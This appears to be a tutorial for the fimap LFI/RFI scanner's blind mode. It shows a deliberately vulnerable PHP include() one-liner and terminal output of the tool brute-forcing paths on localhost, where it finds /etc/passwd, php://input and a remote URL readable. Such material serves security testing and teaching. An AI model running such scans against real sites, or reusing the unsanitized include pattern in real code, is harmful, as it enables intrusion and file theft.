# fimap Blind Mode Introdution #

## 0. Example PHP Code ##
```
<? include($_GET["super"]); ?>
```

## 1. fimap result for it ##
```
imax /st0rage/dev/fimap/src $ ./fimap.py -u "http://localhost/test.php?super=sexy"                                                                                                                                                                 
fimap v.09_svn (For the Swarm)                                                                                                                                                                                                                     
:: Automatic LFI/RFI scanner and exploiter                                                                                                                                                                                                         
:: by Iman Karim (fimap.dev@gmail.com)                                                                                                                                                                                                             
                                                                                                                                                                                                                                                   
SingleScan is testing URL: 'http://localhost/test.php?super=sexy'                                                                                                                                                                                  
[03:11:39] [OUT] Inspecting URL 'http://localhost/test.php?super=sexy'...                                                                                                                                                                          
[03:11:39] [INFO] Fiddling around with URL...                                                                                                                                                                                                      
Target URL isn't affected by any file inclusion bug :(                                                                                                                                                                                             
imax /st0rage/dev/fimap/src $  
```

"WTF?! Why doesn't it work?! I am elite haxx0r."

Well my friend, in this case it's because the webserver has disabled any kind of error messages for us. So fimap can't see that the server has an FI-Bug.
But we can fimap tell to also check blindly for FI-Bugs by bruteforcing the relative path of the file we want to check.
Let's try it!

```
imax /st0rage/dev/fimap/src $ ./fimap.py -u "http://localhost/test.php?super=sexy" -b                                                                                                                                                              
fimap v.09_svn (For the Swarm)                                                                                                                                                                                                                     
:: Automatic LFI/RFI scanner and exploiter                                                                                                                                                                                                         
:: by Iman Karim (fimap.dev@gmail.com)                                                                                                                                                                                                             
                                                                                                                                                                                                                                                   
Blind FI-error checking enabled.                                                                                                                                                                                                                   
SingleScan is testing URL: 'http://localhost/test.php?super=sexy'                                                                                                                                                                                  
[03:15:09] [OUT] Inspecting URL 'http://localhost/test.php?super=sexy'...                                                                                                                                                                          
[03:15:09] [INFO] Fiddling around with URL...                                                                                                                                                                                                      
[03:15:09] [INFO] Sniper failed. Going blind...                                                                                                                                                                                                    
[03:15:09] [OUT] Possible file inclusion found blindly! -> 'http://localhost/test.php?super=/etc/passwd' with Parameter 'super'.                                                                                                                   
[03:15:09] [OUT] Identifying Vulnerability 'http://localhost/test.php?super=sexy' with Parameter 'super' blindly...                                                                                                                                
[03:15:09] [WARN] Unknown language - Autodetecting...                                                                                                                                                                                              
[03:15:09] [INFO] Autodetect thinks this could be a PHP-Script...                                                                                                                                                                                  
[03:15:09] [INFO] If you think this is wrong start fimap with --no-auto-detect                                                                                                                                                                     
[03:15:09] [INFO] Testing file '/etc/passwd'...                                                                                                                                                                                                    
[03:15:09] [INFO] Testing file '/proc/self/environ'...                                                                                                                                                                                             
[03:15:09] [INFO] Testing file 'php://input'...                                                                                                                                                                                                    
[03:15:09] [INFO] Testing file '/var/log/apache2/access.log'...                                                                                                                                                                                    
[03:15:09] [INFO] Testing file '/var/log/apache/access.log'...                                                                                                                                                                                     
[03:15:09] [INFO] Testing file '/var/log/httpd/access.log'...                                                                                                                                                                                      
[03:15:09] [INFO] Testing file '/var/log/apache2/access_log'...                                                                                                                                                                                    
[03:15:09] [INFO] Testing file '/var/log/apache/access_log'...                                                                                                                                                                                     
[03:15:09] [INFO] Testing file '/var/log/httpd/access_log'...                                                                                                                                                                                      
[03:15:09] [INFO] Testing file 'http://www.phpbb.de/index.php'...                                                                                                                                                                                  
##########################################################                                                                                                                                                                                         
#[1] Possible PHP-File Inclusion                         #                                                                                                                                                                                         
##########################################################                                                                                                                                                                                         
#::REQUEST                                               #                                                                                                                                                                                         
#  [URL]        http://localhost/test.php?super=sexy     #                                                                                                                                                                                         
#  [HEAD SENT]                                           #                                                                                                                                                                                         
#::VULN INFO                                             #                                                                                                                                                                                         
#  [GET PARAM]  super                                    #                                                                                                                                                                                         
#  [PATH]       Not received (Blindmode)                 #                                                                                                                                                                                         
#  [OS]         Unix                                     #                                                                                                                                                                                         
#  [TYPE]       Blindly Identified                       #                                                                                                                                                                                         
#  [TRUNCATION] Not tested.                              #                                                                                                                                                                                         
#  [READABLE FILES]                                      #                                                                                                                                                                                         
#                   [0] /etc/passwd                      #                                                                                                                                                                                         
#                   [1] php://input                      #                                                                                                                                                                                         
#                   [2] http://www.phpbb.de/index.php    #                                                                                                                                                                                         
##########################################################                                                                                                                                                                                         
imax /st0rage/dev/fimap/src $  
```

Well that looks much much better!